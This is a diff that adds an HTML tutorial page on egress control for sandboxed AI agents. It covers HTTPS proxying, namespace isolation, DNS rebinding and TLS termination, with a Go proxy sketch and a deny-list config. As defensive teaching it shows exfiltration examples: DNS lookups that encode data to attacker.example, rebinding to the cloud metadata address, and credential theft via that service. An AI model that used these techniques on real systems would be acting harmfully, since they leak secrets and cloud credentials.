@@ -1,0 +1,266 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Network and Egress</title>
+<meta name="description" content="Egress control for agents: DNS, TCP, TLS and proxies step by step, CONNECT tunnels, enforcing the proxy with network namespaces, SSRF and DNS rebinding, TLS termination.">
+<style>
+:root{--bg:#fbfaf7;--surface:#fff;--surface-2:#f3f1ec;--text:#1d1c1a;--muted:#5f5c55;--line:#e2ded5;--accent:#b4532a;--accent-soft:#f6e6dc;--ok:#2f6b45;--ok-soft:#e1efe5;--warn:#8a5a00;--warn-soft:#f7edd6;--bad:#9c2f2f;--bad-soft:#f6e0e0;--code-bg:#f4f2ed;--code-text:#2a2824;--mono:ui-monospace,"SF Mono","JetBrains Mono",Menlo,Consolas,monospace;--sans:-apple-system,BlinkMacSystemFont,"Inter","Segoe UI",Roboto,sans-serif;--serif:"Iowan Old Style","Charter",Georgia,serif}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#161513;--surface:#1e1d1a;--surface-2:#262420;--text:#ebe8e1;--muted:#a6a197;--line:#36332d;--accent:#e8835a;--accent-soft:#3a2519;--ok:#7cc396;--ok-soft:#1c2e22;--warn:#e0b660;--warn-soft:#33290f;--bad:#e88b8b;--bad-soft:#3a1c1c;--code-bg:#1b1a17;--code-text:#e3dfd6}}
+:root[data-theme="dark"]{--bg:#161513;--surface:#1e1d1a;--surface-2:#262420;--text:#ebe8e1;--muted:#a6a197;--line:#36332d;--accent:#e8835a;--accent-soft:#3a2519;--ok:#7cc396;--ok-soft:#1c2e22;--warn:#e0b660;--warn-soft:#33290f;--bad:#e88b8b;--bad-soft:#3a1c1c;--code-bg:#1b1a17;--code-text:#e3dfd6}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font:16px/1.65 var(--sans)}
+.topbar{position:sticky;top:0;z-index:5;background:var(--bg);border-bottom:1px solid var(--line)}
+.topbar .in{max-width:780px;margin:0 auto;padding:10px 20px;display:flex;align-items:center;gap:12px}
+.topbar .home{font-family:var(--serif);font-weight:600;color:var(--text);text-decoration:none;white-space:nowrap}
+.topbar .sp{flex:1}
+.topbar details{position:relative}
+.topbar summary{cursor:pointer;list-style:none;font-size:13px;color:var(--muted);border:1px solid var(--line);border-radius:8px;padding:5px 10px;background:var(--surface)}
+.topbar summary::-webkit-details-marker{display:none}
+.topbar .menu{position:absolute;right:0;top:36px;background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:8px;min-width:240px;box-shadow:0 8px 24px rgba(0,0,0,.12)}
+.topbar .menu a{display:block;padding:6px 10px;border-radius:6px;color:var(--text);text-decoration:none;font-size:14px}
+.topbar .menu a:hover{background:var(--surface-2)}
+.topbar .menu a.cur{color:var(--accent);font-weight:600}
+.topbar .menu .n{display:inline-block;width:26px;color:var(--muted);font-family:var(--mono);font-size:12px}
+.themebtn{background:var(--surface);border:1px solid var(--line);color:var(--muted);border-radius:8px;padding:5px 10px;font-size:13px;cursor:pointer}
+main{max-width:780px;margin:0 auto;padding:40px 20px 100px}
+.kicker{font-size:12px;letter-spacing:.1em;text-transform:uppercase;color:var(--accent);font-weight:600}
+h1{font-family:var(--serif);font-size:42px;line-height:1.12;margin:10px 0 12px;font-weight:600;letter-spacing:-.01em}
+h2{font-family:var(--serif);font-size:28px;line-height:1.2;margin:60px 0 6px;font-weight:600;scroll-margin-top:70px}
+h3{font-size:18px;margin:30px 0 6px;scroll-margin-top:70px}
+h4{font-size:13px;margin:20px 0 4px;text-transform:uppercase;letter-spacing:.06em;color:var(--muted)}
+p{margin:10px 0 14px}
+.lede{font-size:19px;color:var(--muted)}
+a{color:var(--accent)}
+code{font-family:var(--mono);font-size:.88em;background:var(--code-bg);padding:1px 5px;border-radius:4px;overflow-wrap:anywhere}
+pre{background:var(--code-bg);color:var(--code-text);border:1px solid var(--line);border-radius:10px;padding:16px 18px;overflow-x:auto;font:13px/1.55 var(--mono);margin:14px 0 18px}
+pre code{background:none;padding:0;font-size:inherit;overflow-wrap:normal}
+pre .c{color:var(--muted);font-style:italic}
+pre .k{color:var(--accent)}
+pre b{color:var(--accent);font-weight:600}
+.cap{font-size:12px;color:var(--muted);font-family:var(--mono);margin:16px 0 -8px}
+table{width:100%;border-collapse:collapse;font-size:14.5px;margin:14px 0 20px}
+th,td{text-align:left;padding:9px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-size:12px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted);font-weight:600}
+.tw{overflow-x:auto}
+.callout{border-radius:10px;padding:14px 18px;margin:18px 0;border:1px solid var(--line);background:var(--surface)}
+.callout b.t{display:block;font-size:12px;text-transform:uppercase;letter-spacing:.07em;margin-bottom:4px}
+.callout.why{background:var(--accent-soft);border-color:transparent}.callout.why b.t{color:var(--accent)}
+.callout.gotcha{background:var(--warn-soft);border-color:transparent}.callout.gotcha b.t{color:var(--warn)}
+.callout.ok{background:var(--ok-soft);border-color:transparent}.callout.ok b.t{color:var(--ok)}
+.callout.bad{background:var(--bad-soft);border-color:transparent}.callout.bad b.t{color:var(--bad)}
+.callout p:first-of-type{margin-top:0}.callout p:last-child,.callout ul:last-child,.callout ol:last-child{margin-bottom:0}
+.oneminute{border-left:3px solid var(--accent);background:var(--surface);border-radius:0 10px 10px 0;padding:14px 18px;margin:22px 0}
+.oneminute b.t{display:block;font-size:12px;text-transform:uppercase;letter-spacing:.07em;color:var(--accent);margin-bottom:4px}
+.oneminute p:last-child{margin-bottom:0}.oneminute p:first-of-type{margin-top:0}
+ol.steps{list-style:none;counter-reset:st;padding:0;margin:16px 0 20px}
+ol.steps>li{counter-increment:st;position:relative;padding:2px 0 12px 42px;border-left:2px solid var(--line);margin-left:13px}
+ol.steps>li:last-child{border-left-color:transparent}
+ol.steps>li::before{content:counter(st);position:absolute;left:-14px;top:0;width:26px;height:26px;border-radius:50%;background:var(--accent);color:#fff;font:600 13px/26px var(--sans);text-align:center}
+ol.steps pre{margin:8px 0 4px}
+.flow{display:flex;flex-wrap:wrap;align-items:center;gap:8px;margin:18px 0;font-size:13.5px}
+.flow .b{background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:7px 11px;font-family:var(--mono);font-size:12.5px}
+.flow .b.hl{border-color:var(--accent);color:var(--accent)}
+.flow .ar{color:var(--muted)}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:14px 16px}
+.card h4{margin:0 0 4px;color:var(--text);text-transform:none;letter-spacing:0;font-size:15px}
+.card p{margin:0;font-size:14.5px;color:var(--muted)}
+a.card{text-decoration:none;color:inherit;display:block}
+a.card:hover{border-color:var(--accent)}
+.spec{border:1px solid var(--line);border-radius:10px;background:var(--surface);padding:4px 18px 10px;margin:18px 0}
+.spec>b{display:block;font-size:12px;text-transform:uppercase;letter-spacing:.07em;color:var(--muted);margin:12px 0 2px}
+.spec ul{margin:6px 0 10px;padding-left:20px}
+ul.tight li,ol.tight li{margin:3px 0}
+.check{margin:28px 0 0}
+details.q{border:1px solid var(--line);border-radius:10px;background:var(--surface);padding:10px 16px;margin:10px 0}
+details.q summary{cursor:pointer;font-weight:600}
+details.q[open] summary{margin-bottom:6px}
+details.q p:last-child{margin-bottom:4px}
+.nextprev{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:70px;padding-top:24px;border-top:1px solid var(--line)}
+.nextprev a{display:block;border:1px solid var(--line);border-radius:10px;padding:12px 16px;text-decoration:none;color:var(--text);background:var(--surface)}
+.nextprev a:hover{border-color:var(--accent)}
+.nextprev small{display:block;color:var(--muted);font-size:12px;text-transform:uppercase;letter-spacing:.06em}
+.nextprev .nx{text-align:right;grid-column:2}
+.pill{display:inline-block;font-size:11.5px;font-weight:600;padding:2px 8px;border-radius:999px;background:var(--surface-2);color:var(--muted);margin-right:4px}
+.stack{margin:22px 0;display:flex;flex-direction:column;gap:6px}
+.layer{display:grid;grid-template-columns:160px 1fr 120px;gap:14px;align-items:center;background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:10px 14px;font-size:14.5px;text-decoration:none;color:var(--text)}
+.layer:hover{border-color:var(--accent)}
+.layer .n{font-weight:600}.layer .d{color:var(--muted)}.layer .c{font-family:var(--mono);font-size:12px;color:var(--accent);text-align:right}
+footer{margin-top:40px;color:var(--muted);font-size:13px}
+@media (max-width:680px){h1{font-size:32px}h2{font-size:24px}.grid2{grid-template-columns:1fr}.layer{grid-template-columns:1fr;gap:2px}.layer .c{text-align:left}.nextprev{grid-template-columns:1fr}.nextprev .nx{grid-column:1}.topbar .home span{display:none}}
+</style>
+</head>
+<body>
+<div class="topbar"><div class="in">
+<a class="home" href="index.html">◆ <span>Agent stack guide</span></a>
+<div class="sp"></div>
+<details><summary>Contents ▾</summary><div class="menu">
+<a href="index.html"><span class="n">·</span>Start here</a>
+<a href="01-processes.html"><span class="n">01</span>Processes &amp; syscalls</a>
+<a href="02-mcp.html"><span class="n">02</span>Tools over MCP</a>
+<a href="03-isolation.html"><span class="n">03</span>Isolation</a>
+<a href="04-network.html" class=cur><span class="n">04</span>Network &amp; egress</a>
+<a href="05-identity.html"><span class="n">05</span>Identity &amp; secrets</a>
+<a href="06-policy.html"><span class="n">06</span>Policy &amp; injection</a>
+<a href="07-tracing.html"><span class="n">07</span>Tracing</a>
+<a href="08-control-plane.html"><span class="n">08</span>Run control plane</a>
+<a href="09-harness.html"><span class="n">09</span>The harness</a>
+<a href="10-build-plan.html"><span class="n">10</span>Build plan</a>
+</div></details>
+<button class="themebtn" onclick="toggleTheme()" aria-label="Toggle light or dark theme">Theme</button>
+</div></div>
+<main>
+<div class="kicker">Part 4 · Component: gate</div>
+<h1>Network and egress control</h1>
+<p class="lede">What actually happens when a program makes an HTTPS request, how a proxy can allow or refuse it, how to make the proxy the only way out, and the routes data still escapes by.</p>
+<div class="oneminute"><b class="t">In one minute</b>
+<p>"Egress" means outbound traffic. Most agents need a little network (a package registry, a git host) but not all of it, and unrestricted network is how stolen data leaves and how a compromised run reaches internal systems. The design: the sandbox has <b>no network at all</b> except a path to one proxy, the <b>gate</b>, which checks each destination against a list, refuses the rest, and logs everything. The hard parts are the details: DNS, private addresses, hostnames that change what they point to, and allowed sites that accept uploads.</p></div>
+
+<h2 id="request">What happens when a program fetches a URL</h2>
+<p>You need this picture to understand what a proxy can and can't see. Here's <code>curl https://pypi.org/simple/requests/</code> with no proxy:</p>
+<ol class="steps">
+  <li><b>DNS lookup.</b> The program asks a resolver (listed in <code>/etc/resolv.conf</code>) "what's the IP address of pypi.org?". That's a small, usually unencrypted message to port 53. The answer is an address such as <code>203.0.113.10</code>.</li>
+  <li><b>TCP connection.</b> The program connects to <code>203.0.113.10</code> on port 443 (HTTPS). TCP is the reliable byte-stream that everything else rides on.</li>
+  <li><b>TLS handshake.</b> The client says hello and includes the hostname it wants, <code>pypi.org</code>, <b>in plain text</b> (this field is called SNI). The server sends its certificate: a document saying "this key belongs to pypi.org", signed by a certificate authority (CA). The client checks the signature against the CAs it trusts and checks the name matches. Then both sides agree on keys and everything after this point is encrypted.</li>
+  <li><b>HTTP request, inside the encryption:</b> <code>GET /simple/requests/</code> with headers like <code>Host</code> and maybe <code>Authorization</code>.</li>
+  <li><b>Response</b>, also encrypted.</li>
+</ol>
+<p>So someone on the network path sees: the DNS question, the destination IP, the SNI hostname, and the size and timing of traffic. They don't see the path, the headers (including tokens) or the content. Keep this in mind: a proxy that doesn't decrypt is in the same position.</p>
+
+<h2 id="proxy">How a proxy fits in</h2>
+<p>Almost every HTTP client honours the environment variables <code>HTTPS_PROXY</code>, <code>HTTP_PROXY</code> and <code>NO_PROXY</code>. With <code>HTTPS_PROXY=http://127.0.0.1:3128</code> set, the same request becomes:</p>
+<ol class="steps">
+  <li><b>The client connects to the proxy</b>, not to pypi.org, and doesn't do any DNS lookup itself.</li>
+  <li><b>It asks for a tunnel</b> with one line of plain HTTP:
+<pre><code>CONNECT pypi.org:443 HTTP/1.1
+Host: pypi.org:443</code></pre></li>
+  <li><b>The proxy decides.</b> It knows the destination hostname from that line. If it's allowed, the proxy resolves the name, opens a TCP connection to it, and replies <code>HTTP/1.1 200 Connection Established</code>. If not, it replies <code>403</code> and closes.</li>
+  <li><b>The client does TLS through the tunnel</b>, directly with pypi.org. The proxy just copies bytes both ways; they're encrypted, so it can't read them.</li>
+</ol>
+<p>That's the whole mechanism of a hostname allowlist. In Go, the core of it fits on a screen:</p>
+<pre><code>func (g *Gate) ServeHTTP(w http.ResponseWriter, r *http.Request) {
+    if r.Method != http.MethodConnect { http.Error(w, "CONNECT only", 405); return }
+    host, port, _ := net.SplitHostPort(r.Host)
+    if !g.allowed(host, port) {                       <span class="c">// check BEFORE resolving anything</span>
+        g.audit(r, "deny"); http.Error(w, "blocked by egress policy", 403); return
+    }
+    up, err := g.dialChecked(r.Context(), host, port) <span class="c">// resolves, refuses private IPs (below)</span>
+    if err != nil { http.Error(w, "upstream refused", 502); return }
+    client, _, _ := w.(http.Hijacker).Hijack()        <span class="c">// take over the raw connection</span>
+    client.Write([]byte("HTTP/1.1 200 Connection Established\r\n\r\n"))
+    g.audit(r, "allow")
+    go io.Copy(up, client)                            <span class="c">// encrypted bytes, both directions</span>
+    io.Copy(client, up)
+    client.Close(); up.Close()
+}</code></pre>
+<div class="callout gotcha"><b class="t">An environment variable is a convenience, not a control</b>
+<p>Programs <em>choose</em> to honour <code>HTTPS_PROXY</code>. Malicious code, raw sockets and some tools just ignore it and connect directly. So the proxy setting tells well-behaved programs where to go; something else has to make sure there's <em>nowhere else</em> to go.</p></div>
+
+<h2 id="enforce">Making the gate the only way out</h2>
+<p>Recall from the <a href="03-isolation.html#namespaces">isolation page</a> that a new network namespace is empty: just a loopback interface, switched off. The sandbox starts with no way out. The question is how to add exactly one door. Two designs:</p>
+<h3>Design A: a virtual cable and a firewall</h3>
+<p>Create a <b>veth pair</b> (two virtual network cards connected like a cable), put one end in the sandbox's namespace with address <code>10.200.0.2</code> and keep the other on the host as <code>10.200.0.1</code>. Then add firewall rules on the host: traffic from <code>10.200.0.2</code> may reach <code>10.200.0.1:3128</code> (the gate) and nothing else. This is how container networking usually works. Its downside: configuring host interfaces and firewall rules needs root on the host.</p>
+<h3>Design B: no network, one socket file (simpler, recommended)</h3>
+<ol class="steps">
+  <li><b>The gate listens on a Unix socket</b>, a file like <code>/run/box/run_42/gate.sock</code>. Unix sockets are like network connections, but addressed by a file path and only reachable on the same machine.</li>
+  <li><b>The sandbox's root filesystem includes that one file</b> through a bind mount, for example at <code>/run/gate.sock</code>.</li>
+  <li><b>Inside the sandbox, box starts a tiny forwarder</b> before running the command: it switches on the loopback interface, listens on <code>127.0.0.1:3128</code>, and pipes each connection it accepts to <code>/run/gate.sock</code>.</li>
+  <li><b>The command gets <code>HTTPS_PROXY=http://127.0.0.1:3128</code></b>. Well-behaved tools go through the forwarder to the gate.</li>
+  <li><b>Everything else fails</b>, because the namespace has no interface other than loopback and no routes. Code that ignores the proxy variable finds nothing to connect to. If the untrusted program kills the forwarder, networking simply stops: it fails closed.</li>
+</ol>
+<p>Design B needs no root on the host, keeps the gate entirely outside the sandbox, and makes the gate the only reachable thing by construction rather than by firewall rule.</p>
+
+<h2 id="dns">DNS: the leak people forget</h2>
+<p>DNS lookups are themselves messages to the outside world, and they can carry data. If an attacker owns <code>attacker.example</code>, a lookup for <code>c2VjcmV0.attacker.example</code> delivers the encoded secret to their DNS server, even if no connection is ever made. With Design B the sandbox has no resolver, so programs can't do DNS directly. But look at the gate:</p>
+<ol class="steps">
+  <li>The sandboxed program sends <code>CONNECT c2VjcmV0.attacker.example:443</code>.</li>
+  <li>A careless gate <b>resolves the name first</b> to see where it points… and that lookup just delivered the data.</li>
+  <li>A careful gate <b>checks the allowlist first</b>, sees the name isn't on it, and refuses without any lookup.</li>
+</ol>
+<p>Order matters: allowlist check, then resolve, then connect.</p>
+
+<h2 id="private">Private addresses, the metadata service, and DNS rebinding</h2>
+<h3>Never connect inward</h3>
+<p>Even an allowed hostname must never lead to an internal address. Before connecting, the gate checks the resolved IP against ranges that mean "not the public internet": loopback (<code>127.0.0.0/8</code>), private networks (<code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code>), carrier-grade NAT (<code>100.64.0.0/10</code>), link-local (<code>169.254.0.0/16</code>), and their IPv6 equivalents.</p>
+<div class="callout bad"><b class="t">The metadata service: the most valuable address in the cloud</b>
+<p>On cloud VMs, <code>169.254.169.254</code> answers HTTP requests from the VM itself with information about the instance, including <b>short-lived credentials for the VM's service account</b>. An agent running on a cloud VM with open network can simply ask for them, and then act as the VM's identity in your cloud account. Most clouds now require a special header or token for these requests, which stops some simple attacks, but not an agent that can run <code>curl</code> with any headers it likes. Block it always, by IP and by name.</p></div>
+<h3>DNS rebinding, step by step</h3>
+<p>Here's why "check the IP" has to be done carefully. The attacker controls <code>rebind.attacker.example</code> and makes its DNS answers expire immediately.</p>
+<ol class="steps">
+  <li>Suppose the attacker's domain is allowed (say, a wildcard you added for convenience).</li>
+  <li>The gate <b>resolves</b> the name to check it: <code>203.0.113.5</code>, public, fine.</li>
+  <li>The gate then calls a normal "connect to hostname" function, which <b>resolves again</b>. This time the attacker's DNS answers <code>169.254.169.254</code>.</li>
+  <li>The gate connects to the metadata service, having "checked" a different address.</li>
+</ol>
+<p>The fix is to resolve once and connect to <b>the exact address you checked</b>, or to check at connect time. In Go, <code>net.Dialer</code> has a <code>Control</code> hook that's called with the actual IP address being connected to, just before the connection is made. Putting the private-range check there makes it impossible to bypass this way.</p>
+
+<h2 id="remaining">What an allowlist still doesn't stop</h2>
+<ul>
+  <li><b>Allowed sites that accept data.</b> If <code>github.com</code> is allowed, so is creating a public gist, pushing to an attacker's repository or commenting on an issue. Package registries accept uploads. Many "read-only" destinations have a write path. Egress narrows the options; <a href="05-identity.html">identity</a> (no write tokens beyond what's needed) and <a href="06-policy.html">policy</a> close the rest.</li>
+  <li><b>Data in URLs to allowed hosts.</b> A request to an allowed host can carry data in its path or query string. Whether that's a leak depends on whether the attacker can read that host's logs or content.</li>
+  <li><b>Anything inside an allowed tunnel.</b> Without decryption, the gate sees only the hostname. It can't tell <code>GET</code> from <code>POST</code>, or a 1 KB request from a 1 GB upload, except by counting bytes.</li>
+</ul>
+
+<h2 id="tls">Level 2: decrypting at the gate (TLS termination)</h2>
+<p>To see and control <em>what</em> is sent (paths, methods, sizes) or to add credentials (next page), the gate has to decrypt the traffic. It does that by acting as the destination server toward the sandbox, using certificates it creates itself:</p>
+<ol class="steps">
+  <li><b>Once, at setup:</b> the gate creates its own certificate authority, a key pair and a CA certificate. The sandbox is configured to trust that CA: it's added to the trust store inside the sandbox's filesystem, and pointed to by environment variables tools look at (<code>SSL_CERT_FILE</code>, <code>REQUESTS_CA_BUNDLE</code> for Python, <code>NODE_EXTRA_CA_CERTS</code> for Node, and so on).</li>
+  <li><b>The program sends <code>CONNECT api.github.com:443</code>.</b> The gate checks the allowlist and replies <code>200</code>, but doesn't open the tunnel. Instead it plays the server.</li>
+  <li><b>The gate presents a certificate for <code>api.github.com</code></b> that it generated on the spot and signed with its CA. The program checks it, finds a trusted CA signature and a matching name, and is satisfied.</li>
+  <li><b>The gate now reads the plain HTTP request:</b> method, path, headers, body. It applies rules (only <code>GET</code> on this host, only these paths, bodies under 1 MB) and can add or remove headers.</li>
+  <li><b>The gate opens its own, real TLS connection</b> to <code>api.github.com</code>, verifying the <em>real</em> certificate against the normal public CAs, forwards the request, and streams the response back.</li>
+</ol>
+<div class="callout gotcha"><b class="t">What it costs</b>
+<ul class="tight">
+<li><b>The CA key becomes a crown jewel.</b> Anyone holding it can impersonate any website to your sandboxes. It lives only in the gate, never in a sandbox.</li>
+<li><b>You own TLS correctness.</b> If the gate forgets to verify the upstream certificate, it has quietly removed TLS protection for everything.</li>
+<li><b>Some clients refuse.</b> Programs that pin a specific certificate, or ship their own trust store, will fail until configured.</li>
+<li><b>More protocol work:</b> HTTP/2, websockets and streaming bodies all have to be handled correctly.</li>
+</ul></div>
+<div class="callout ok"><b class="t">The real example again</b>
+<p>The cloud environment that produced this guide works exactly like this: outbound HTTPS goes through a proxy, the proxy has its own CA bundle that tools inside are pointed at, and destinations outside its allowlist are refused before any connection is made.</p></div>
+
+<h2 id="build">What you'll build: gate (network part)</h2>
+<div class="spec">
+  <b>Configuration</b>
+<pre><code><span class="c"># gate.yaml</span>
+default: deny
+profiles:
+  go-dev:     { allow: [proxy.golang.org, sum.golang.org, github.com, codeload.github.com] }
+  python-dev: { allow: [pypi.org, files.pythonhosted.org] }
+deny_always:
+  ips:   [127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, 100.64.0.0/10, "::1/128", "fc00::/7", "fe80::/10"]
+  names: [metadata.google.internal]</code></pre>
+  <b>Stages</b>
+  <ul class="tight">
+    <li>v0: CONNECT only, hostname allowlist per run, check-before-resolve, private-range check in the dialer's <code>Control</code> hook, JSON-lines audit log (time, run, host, decision, bytes each way).</li>
+    <li>v1: <code>box --net gate</code> using Design B; the gate tells runs apart by which socket the connection arrived on.</li>
+    <li>v2: optional TLS termination with a per-installation CA, method and path rules, body size limits, then credential injection (<a href="05-identity.html">next page</a>).</li>
+  </ul>
+  <b>Done means</b>
+  <ul class="tight">
+    <li><code>pip install requests</code> works under <code>python-dev</code>; <code>curl https://example.com</code> gets a 403 and an audit line.</li>
+    <li>A hostname that resolves to <code>169.254.169.254</code> is refused even if allowed, including a rebinding test.</li>
+    <li>A program that ignores <code>HTTPS_PROXY</code> can't reach anything.</li>
+  </ul>
+</div>
+
+<div class="check"><h2 id="check">Check yourself</h2>
+<details class="q"><summary>Without TLS termination, what does the gate know about an allowed HTTPS request?</summary><p>The destination hostname and port (from the CONNECT line), the IP it connected to, and the number of bytes and timing in each direction. Not the method, path, headers or content.</p></details>
+<details class="q"><summary>Why is setting <code>HTTPS_PROXY</code> not enough on its own?</summary><p>Programs choose whether to honour it. Malicious code can connect directly. The network namespace with no route except to the gate is what enforces it.</p></details>
+<details class="q"><summary>Why must the gate check the allowlist before resolving the hostname?</summary><p>Because the DNS lookup itself sends the hostname to the domain's DNS server, and an attacker can encode data in it. Resolving a non-allowed name already leaks.</p></details>
+<details class="q"><summary><code>github.com</code> is on the allowlist. Name two ways data could still leave.</summary><p>For example: pushing to an attacker's repository or creating a public gist (if any write credential is available), or putting data in the URL of requests to allowed hosts whose content or logs the attacker can read.</p></details>
+</div>
+
+<nav class="nextprev"><a class="pv" href="03-isolation.html"><small>← Previous</small>Isolation</a><a class="nx" href="05-identity.html"><small>Next →</small>Identity &amp; secrets</a></nav>
+<footer>Agent stack guide · a personal learning project, November 2026. · <a href="../../index.html">yannis radhima</a></footer>
+</main>
+<script>
+function toggleTheme(){var r=document.documentElement;var d=r.getAttribute('data-theme')?r.getAttribute('data-theme')==='dark':window.matchMedia('(prefers-color-scheme: dark)').matches;r.setAttribute('data-theme',d?'light':'dark');try{localStorage.setItem('theme',r.getAttribute('data-theme'))}catch(e){}}
+try{var t=localStorage.getItem('theme');if(t)document.documentElement.setAttribute('data-theme',t)}catch(e){}
+document.addEventListener('click',function(e){var d=document.querySelector('.topbar details');if(d&&d.open&&!d.contains(e.target))d.open=false});
+</script>
+</body>
+</html>
